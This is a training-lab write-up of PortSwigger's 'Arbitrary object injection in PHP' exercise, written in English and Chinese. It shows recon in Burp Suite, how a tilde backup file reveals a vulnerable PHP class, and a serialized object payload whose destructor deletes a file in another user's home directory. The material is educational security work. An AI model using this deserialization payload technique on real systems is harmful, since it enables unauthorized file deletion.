---
title: 'Lab: Arbitrary object injection in PHP'
tags: [Portswigger Web Security Academy, Web]

---

# Lab: Arbitrary object injection in PHP
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.
* Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter
* Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.

## Constructor & Deconstructor
[Python建構函式與解構函式（__init__()和__del__()）](https://tw511.com/a/01/26451.html)
其實概念就是Python的`__init()__` function，在instanciate一個class的時候扮演初始化的功能而已
而deconstructor就是Python中的`__del__()` function用來回收不需要的class，以達到降低記憶體的使用量

## Recon
1. Login and Recon
As the solution of this lab, we first need to arbitrary query something in this website, e.g. query `My account` and forward all packages

2. Use Target Feature in Burp Suite
In my case, the URL of this lab is `https://0a29005704ba2655802d8a75009100d5.web-security-academy.net/my-account?id=wiener`

    So, I can search it in target feature to browse all query of this website.
    ![](https://i.imgur.com/SWrrzgI.png)

3. <font color="FF0000">通靈</font>Something Interesting - `/libs/CustomTemplate.php`
This file may be a vulnerability to achieve our goal.

4. Send to repeater
Obviously, you can not access the content first.
![](https://i.imgur.com/D31vFeN.png)

    By the hint. The solution is using `~` character to read the source code
    ![](https://i.imgur.com/1N1EpQh.png)

    :::spoiler CustomTemplate.php Source Code
    ```php=
    <?php

    class CustomTemplate {
        private $template_file_path;
        private $lock_file_path;

        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
            $this->lock_file_path = $template_file_path . ".lock";
        }

        private function isTemplateLocked() {
            return file_exists($this->lock_file_path);
        }

        public function getTemplate() {
            return file_get_contents($this->template_file_path);
        }

        public function saveTemplate($template) {
            if (!isTemplateLocked()) {
                if (file_put_contents($this->lock_file_path, "") === false) {
                    throw new Exception("Could not write to " . $this->lock_file_path);
                }
                if (file_put_contents($this->template_file_path, $template) === false) {
                    throw new Exception("Could not write to " . $this->template_file_path);
                }
            }
        }

        function __destruct() {
            // Carlos thought this would be a good idea
            if (file_exists($this->lock_file_path)) {
                unlink($this->lock_file_path);
            }
        }
    }

    ?>
    ```
    :::
    
    In this example, we notice that it has constructor and deconstructor so we can constuct a serialization string to delete something
## Exp - Deconstructor
Exploit Payload:
```php!
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Then send it directly and we can delete the specific file properly.
:::spoiler Success Screenshot
![](https://i.imgur.com/NXvqtr5.png)

:::